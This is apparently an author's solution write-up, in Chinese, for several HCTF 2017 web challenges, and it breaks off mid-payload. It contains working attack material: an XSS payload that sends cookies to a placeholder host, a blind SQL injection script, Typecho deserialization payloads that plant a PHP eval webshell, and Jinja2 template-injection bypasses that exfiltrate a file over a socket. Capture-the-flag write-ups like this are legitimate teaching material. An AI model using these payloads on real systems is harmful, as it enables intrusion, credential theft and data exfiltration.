<p>&#x9664;&#x4E86;&#x4E0A;&#x9762;&#x7684;&#x6F0F;&#x6D1E;&#x4EE5;&#x5916;&#xFF0C;messbox&#x4E5F;&#x6709;&#x6F0F;&#x6D1E;&#xFF0C;username&#x5728;&#x9996;&#x9875;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x4EFB;&#x4F55;&#x8FC7;&#x6EE4;&#x5C31;&#x663E;&#x793A;&#x5728;&#x4E86;&#x9875;&#x9762;&#x5185;&#x3002;</p> <p>&#x4F46;username&#x8FD9;&#x91CC;&#x6F0F;&#x6D1E;&#x4F1A;&#x6709;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;&#x672C;&#x8EAB;&#x9884;&#x671F;&#x7684;&#x6F0F;&#x6D1E;&#x70B9;&#x5E76;&#x4E0D;&#x662F;&#x8FD9;&#x91CC;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;username&#x7ECF;&#x8FC7;&#x6211;&#x6846;&#x67B6;&#x672C;&#x8EAB;&#x7684;&#x4E00;&#x70B9;&#x513F;&#x8FC7;&#x6EE4;&#xFF0C;&#x800C;&#x4E14;&#x957F;&#x5EA6;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x6240;&#x4EE5;&#x4ECE;&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x7684;&#x4EBA;&#x4F1A;&#x9047;&#x5230;&#x5F88;&#x591A;&#x975E;&#x9884;&#x671F;&#x7684;&#x95EE;&#x9898;&#x3002;</p> <p>payload&#x5982;&#x4E0B;&#xFF0C;&#x6CE8;&#x518C;&#x540D;&#x4E3A;</p> <pre><code>    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token operator">/</span><span class="token operator">/</span>auth<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>getmessage<span class="token punctuation">.</span>php<span class="token operator">?</span>callback<span class="token operator">=</span>location<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx<span class="token operator">/</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>bbtoa<span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span></code></pre><p>&#x7684;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;token&#x3002;</p> <p>&#x4F20;&#x9012;</p> <pre><code>    http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>messbox<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span><span class="token operator">?</span>token<span class="token operator">=</span><span class="token constant">NDYyMGZlMTNhNWM3YTAxY3xQSE5qY21sd2RDQnpjb</span>
    <span class="token constant">U05THk5aGRYUm9Makl3TVRjdWFHTjBaaTVwYnk5blpYUnRaWE56WVdkbExuQm9jRDlqWVd4c1ltR</span>
    mphejFzYjJOaGRHbHZiajBsTWpkb2RIUndPaTh2Y205dmRHc3VjSGN2SlRJM0pUSmlZblJ2WVNoa
    <span class="token number">2</span>IyTjFiV1Z1ZEM1amIyOXJhV1VwT3k4dlBqd3ZjMk55YVhCMFBnPT0<span class="token operator">=</span></code></pre><p>&#x5373;&#x53EF;</p> <h3 id="sql-silencer">SQL Silencer</h3> <p>&#x6709;&#x4E9B;&#x5047;&#x8FC7;&#x6EE4;&#xFF0C;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x8D34;&#x51FA;&#x6CE8;&#x5165;&#x90E8;&#x5206;&#x6700;&#x91CD;&#x8981;&#x90E8;&#x5206;&#x7684;&#x4EE3;&#x7801;</p> <pre><code>function sql_check<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$sql</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token variable">$sql</span> <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 die<span class="token punctuation">(</span><span class="token string">&apos;We only have 3 users.&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>

 <span class="token variable">$check</span> <span class="token operator">=</span> preg\_match<span class="token punctuation">(</span><span class="token string">&apos;/&amp;|\_|\\+|or|,|and| |\\|\\||#|-|`|;|&quot;|\\&apos;</span><span class="token operator">|</span>\\<span class="token operator">*</span><span class="token operator">|</span>into<span class="token operator">|</span>union<span class="token punctuation">(</span>\<span class="token punctuation">[</span>\\s\\<span class="token constant">S</span>\<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>select<span class="token punctuation">(</span>\<span class="token punctuation">[</span>\\s\\<span class="token constant">S</span>\<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>from<span class="token operator">/</span>i&apos;<span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$check</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
 die<span class="token punctuation">(</span><span class="token string">&quot;Nonono!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
 <span class="token keyword">return</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre><p>&#x8FD9;&#x9053;&#x9898;&#x5176;&#x5B9E;&#x662F;&#x53EF;&#x4EE5;&#x663E;&#x6CE8;&#x7684;&#xFF0C;&#x5404;&#x4F4D;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x53EF;&#x4EE5;&#x5148;&#x53BB;&#x8BD5;&#x8BD5;<br>&#x7136;&#x800C;&#x7531;&#x4E8E;&#x662F;&#x9ED1;&#x540D;&#x5355;&#x4E0D;&#x5168;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x961F;&#x4F0D;&#x90FD;&#x662F;&#x7528;&#x76F2;&#x6CE8;&#x505A;&#x51FA;&#x6765;&#x7684;<br>&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x6709;2&#x4E2A;&#x8868;&#xFF0C;&#x4E00;&#x4E2A;user&#xFF0C;&#x4E00;&#x4E2A;flag<br>user&#x8868;&#x91CC;&#x6709;3&#x6761;&#x6570;&#x636E;&#xFF0C;flag&#x8868;&#x91CC;&#x4E5F;&#x6709;2&#x6761;&#x6570;&#x636E;<br>&#x6240;&#x4EE5;&#x6709;&#x961F;&#x4F0D;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x6D4B;&#x8BD5;select(flag)from(flag)&#x4F1A;&#x8FD4;&#x56DE;there is nothing&#x4ECE;&#x800C;&#x6000;&#x7591;flag&#x8868;&#x4E0D;&#x5B58;&#x5728;<br>&#x56E0;&#x4E3A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4F1A;&#x62A5;&#x9519;&#xFF1A;ERROR 1242 (21000): Subquery returns more than 1 row</p> <p>&#x5148;&#x8BF4;&#x76F2;&#x6CE8;&#x5427;&#xFF0C;&#x7531;&#x4E8E;&#x5F88;&#x591A;&#x51FD;&#x6570;&#x90FD;&#x6CA1;&#x7981;&#x7528;&#xFF0C;&#x76F2;&#x6CE8;&#x7684;&#x65B9;&#x6CD5;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x968F;&#x4FBF;&#x8D34;&#x4E00;&#x4E2A;<br>&#x7531;&#x4E8E;3^1=2 -&gt; Bob ,3^2=1 -&gt; Alice, 3^0 -&gt; Cc<br>&#x770B;flag&#x8868;&#x4E2D;&#x6709;&#x591A;&#x5C11;&#x884C;</p> <p> <code>id<span class="token operator">=</span><span class="token number">3</span><span class="token operator">^</span><span class="token punctuation">(</span>select<span class="token punctuation">(</span>count<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>from<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></p> <p>&#x8FD4;&#x56DE;Alice&#xFF0C;&#x786E;&#x5B9A;flag&#x8868;&#x4E2D;&#x53EA;&#x6709;2&#x6761;&#x6570;&#x636E;<br>&#x8DD1;flag&#x7684;poc:</p> <pre><code>`id<span class="token operator">=</span><span class="token number">3</span><span class="token operator">^</span><span class="token punctuation">(</span>select<span class="token punctuation">(</span>count<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>from<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>where<span class="token punctuation">(</span>binary<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>`</code></pre><p>&#x5199;&#x811A;&#x672C;&#x76F4;&#x63A5;&#x8DD1;&#x5C31;&#x80FD;&#x8DD1;&#x51FA;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x540D;&#xFF0C;&#x7531;&#x4E8E;flag&#x8868;&#x91CC;&#x4E2D;&#x7B2C;&#x4E00;&#x6761;&#x6570;&#x636E;&#x662F;&#x6CA1;&#x5565;&#x7528;&#x7684;&#x3002;&#x7ED9;&#x505A;&#x9898;&#x5E08;&#x5085;&#x4EEC;&#x5E26;&#x6765;&#x4E86;&#x4E9B;&#x56F0;&#x6270;&#xFF0C;&#x6709;&#x4E9B;&#x62B1;&#x6B49;&#x3002;</p> <pre><code><span class="token comment">#!/usr/bin/env python</span>
\<span class="token comment"># -*- coding:utf-8 -*- </span>
\<span class="token comment"># author = &apos;c014&apos;</span>

import requests

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://sqls.2017.hctf.io/index/index.php?id=3^(select(count(1))from(flag)where(binary(flag)&lt;0x{}))&quot;</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&apos;hex&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&apos;Cc&apos;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">=</span> flag <span class="token operator">+</span> chr<span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            print <span class="token string">&apos;\[+\]flag:&apos;</span><span class="token operator">+</span>flag
            <span class="token keyword">break</span></code></pre><p>&#x8DD1;&#x51FA;&#x76EE;&#x5F55;&apos;./H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/&apos;&#x540E;&#x8BBF;&#x95EE;/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/index.php&#x53D1;&#x73B0;&#x642D;&#x7684;&#x662F;typecho<br>&#x53EF;&#x4EE5;&#x62FF;&#x524D;&#x6BB5;&#x65F6;&#x95F4;&#x7684;Typecho&#x524D;&#x53F0;getshell&#x6F0F;&#x6D1E;&#x76F4;&#x63A5;&#x6253;<br>&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x76F4;&#x63A5;&#x56DE;&#x663E;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;&#x4E0A;&#x4F20;shell<br>&#x7531;&#x4E8E;&#x6839;&#x76EE;&#x5F55;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x6709;&#x53EF;&#x5199;&#x6743;&#x9650;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x51C6;&#x5907;&#x4E86;&#x4E00;&#x4E2A;uploads&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x5728;.DS_Store&#x6CC4;&#x9732;<br>&#x76F4;&#x63A5;&#x6253;&#x7684;poc&#x4E3A;&#xFF1A;</p> <pre><code>    <span class="token constant">Url</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>sqls<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>index<span class="token operator">/</span><span class="token constant">H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017</span><span class="token operator">/</span>install<span class="token punctuation">.</span>php<span class="token operator">?</span>finish
    <span class="token constant">Post</span><span class="token punctuation">:</span> __typecho_config<span class="token operator">=</span><span class="token constant">YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9</span>
    <span class="token constant">Referer</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>sqls<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>index<span class="token operator">/</span><span class="token constant">H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017</span><span class="token operator">/</span>install<span class="token punctuation">.</span>php<span class="token operator">?</span>finish<span class="token operator">=</span></code></pre><p>&#x6839;&#x636E;&#x9700;&#x6C42;&#x4FEE;&#x6539;base64&#x5185;&#x5BB9;&#x5373;&#x53EF;<br>&#x4E0A;&#x4F20;shell&#x7684;poc&#x4E3A;&#xFF1A;</p> <pre><code>    <span class="token constant">Url</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>sqls<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>index<span class="token operator">/</span><span class="token constant">H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017</span><span class="token operator">/</span>install<span class="token punctuation">.</span>php<span class="token operator">?</span>finish
    <span class="token constant">Cookie</span><span class="token punctuation">:</span> __typecho_config<span class="token operator">=</span><span class="token constant">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCd1cGxvYWRzL2MwMTQucGhwJywgJzw</span><span class="token operator">/</span>cGhwIEBldmFsKCRfUE9TVFtjXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ<span class="token operator">==</span>
    <span class="token constant">Referer</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>sqls<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>index<span class="token operator">/</span><span class="token constant">H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017</span><span class="token operator">/</span>install<span class="token punctuation">.</span>php</code></pre><p>&#x5373;&#x53EF;&#x5728;uploads&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;c014.php&#x7684;webshell<br>&#x4E4B;&#x540E;&#x4F1A;&#x53D1;&#x73B0;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#x597D;&#x50CF;&#x90FD;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x7981;&#x7528;&#x6389;&#x4E86;<br>&#x8FD9;&#x91CC;&#x7528;php&#x81EA;&#x5E26;&#x7684;&#x5217;&#x76EE;&#x5F55;</p> <pre><code><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string">&quot;glob:///*&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
foreach<span class="token punctuation">(</span><span class="token variable">$c</span> as <span class="token variable">$cc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 echo <span class="token variable">$cc</span><span class="token punctuation">,</span><span class="token string">&quot;&lt;/br&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre><p>&#x53D1;&#x73B0;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x6709;&#x4E2A; /flag_is_here &#x7684;&#x6587;&#x4EF6;&#x5939;<br>&#x7136;&#x540E;&#x8BFB;&#x53D6;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;flag&#x6587;&#x4EF6;</p> <p>echo file_get_contents(&apos;/flag_is_here/flag&apos;);</p> <p>get flag~</p> <p>&#x8FD9;&#x9898;&#x6211;&#x4E00;&#x5F00;&#x59CB;&#x662F;&#x60F3;&#x8003;&#x663E;&#x6CE8;&#x7ED5;&#x8FC7;waf</p> <pre><code>`<span class="token operator">/</span>union<span class="token punctuation">(</span><span class="token punctuation">[</span>\s\<span class="token constant">S</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>\s\<span class="token constant">S</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>from<span class="token operator">/</span>i`</code></pre><p>&#x8D34;&#x4E00;&#x4E0B;&#x6211;&#x9884;&#x671F;&#x7684;&#x663E;&#x6CE8;poc</p> <pre><code>`id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">|</span><span class="token variable">@c</span><span class="token punctuation">:</span><span class="token operator">=</span><span class="token punctuation">(</span>select<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>union<span class="token punctuation">(</span>select<span class="token variable">@c</span><span class="token punctuation">)</span>`</code></pre><p>&#x8BFB;&#x76EE;&#x5F55;&#x7684;exp&#x4E3A;:</p> <pre><code>`id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">|</span><span class="token variable">@c</span><span class="token punctuation">:</span><span class="token operator">=</span><span class="token punctuation">(</span>select<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>from<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>where<span class="token punctuation">(</span>flag<span class="token operator">&lt;</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>union<span class="token punctuation">(</span>select<span class="token variable">@c</span><span class="token punctuation">)</span>`</code></pre><h3 id="repeater">Repeater</h3> <p>&#x9898;&#x76EE;&#x662F;&#x6839;&#x636E;<a href="https://0day.work/jinja2-template-injection-filter-bypasses/"target="_blank">&#x539F;&#x6587;</a>&#x9B54;&#x6539;&#x7684;<br>&#x6253;&#x5F00;&#x9898;&#x76EE;F12&#x53D1;&#x73B0;server&#x4E3A;</p> <p> <code><span class="token constant">Server</span><span class="token punctuation">:</span> <span class="token constant">Werkzeug</span><span class="token operator">/</span><span class="token number">0.12</span><span class="token number">.2</span> <span class="token constant">Python</span><span class="token operator">/</span><span class="token number">2.7</span><span class="token number">.12</span></code></p> <p>&#x7136;&#x540E;&#x53D1;&#x73B0;&#x8F93;&#x5165;x&#x5C31;&#x8FD4;&#x56DE;x was not found.<br>&#x5DEE;&#x4E0D;&#x591A;&#x53EF;&#x4EE5;&#x60F3;&#x5230;jinja&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x95EE;&#x9898;<br>&#x6D4B;&#x8BD5;</p> <p> <code>secret<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></p> <p>&#x8FD4;&#x56DE;1 was not found.&#x5373;&#x53EF;&#x9A8C;&#x8BC1;<br>&#x7531;&#x4E8E;&#x4E5F;&#x662F;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;&#x770B;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x59FF;&#x52BF;<br>request.args&#x8FC7;&#x6EE4;&#x4E86;</p> <p> <code>&#x7A7A;&#x683C;<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span>&#xFF0C;&#x56DE;&#x8F66;<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">0</span>a<span class="token punctuation">)</span>&#xFF0C;<span class="token string">&apos;__&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;[&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;]&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;os&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;&quot;&apos;</span><span class="token punctuation">,</span><span class="token string">&quot;|[a-z]&quot;</span></code></p> <p>&#x76F4;&#x63A5;&#x6784;&#x9020;&#x662F;&#x53EF;&#x4EE5;bypass&#x7684;<br>&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x7528;tab(%09)&#x7ED5;&#x8FC7;&#xFF0C;|&#x540E;&#x4E0D;&#x5141;&#x8BB8;&#x63A5;a-z&#x53EF;&#x4EE5;&#x7528;%0c&#xFF0C;tab&#x7B49;&#x7ED5;&#x8FC7;&#xFF0C;os&#x53EF;&#x4EE5;&#x901A;&#x8FC7;python&#x4E2D;exec&#x7ED5;&#x8FC7;<br>&#x4F46;&#x662F;&#x8FD9;&#x9898;&#x8FC7;&#x6EE4;&#x4EC5;&#x9650;&#x4E8E;request.args&#x4F46;&#x662F;&#x4E0D;&#x5141;&#x8BB8;post<br>&#x7B80;&#x5355;&#x7684;&#x529E;&#x6CD5;&#x662F;&#x53EF;&#x4EE5;&#x7528;request.cookies&#x6765;&#x7ED5;&#x8FC7;<br>&#x53EA;&#x80FD;&#x8BFB;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#x8981;&#x627E;flag&#x9996;&#x5148;&#x9700;&#x8981;&#x5148;&#x5230;/etc/passwd&#x770B;&#x5230;&#x6709;hctf&#x7528;&#x6237;,&#x7136;&#x540E;&#x8BFB;&#x53D6;/home/hctf/.bash_history,&#x53D1;&#x73B0;flag&#x8DEF;&#x5F84;/h3h3_1s_your_flag/flag,&#x5728;&#x8BFB;&#x53D6;flag<br>&#x968F;&#x4FBF;&#x5217;&#x51E0;&#x79CD;&#x89E3;&#x9898;&#x65B9;&#x6CD5;<br>1.&#x4E0D;&#x7528;blask_list&#x91CC;&#x7684;&#x7B26;&#x53F7;</p> <pre><code>    secret<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">0</span>ca<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>e<span class="token punctuation">,</span>f<span class="token punctuation">,</span>g<span class="token punctuation">,</span>h<span class="token punctuation">,</span>i<span class="token operator">=</span>request<span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cattr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cformat<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">,</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">,</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">,</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cattr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>mro<span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cformat<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">,</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">,</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">,</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">%}{{(i|%0cattr(request.args.subc|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token punctuation">.</span>from_pyfile<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">%s%sclass%</span>s<span class="token string">%s&amp;mro=%s%smro%s%s&amp;</span>subc<span class="token operator">=</span><span class="token string">%s%ssubclasses%</span>s<span class="token string">%s&amp;usc=_&amp;</span>file<span class="token operator">=</span><span class="token operator">/</span>tmp<span class="token operator">/</span>foo<span class="token punctuation">.</span>py<span class="token operator">&amp;</span>write<span class="token operator">=</span>w<span class="token operator">&amp;</span>a<span class="token operator">=</span>_<span class="token operator">&amp;</span>payload<span class="token operator">=</span>import<span class="token operator">%</span><span class="token number">0</span>csocket<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span>socket<span class="token punctuation">.</span><span class="token constant">SOCK_STREAM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&apos;xxx.xxx.xxx.xxx&apos;</span><span class="token punctuation">,</span><span class="token number">2333</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">&apos;/h3h3_1s_your_flag/flag&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token 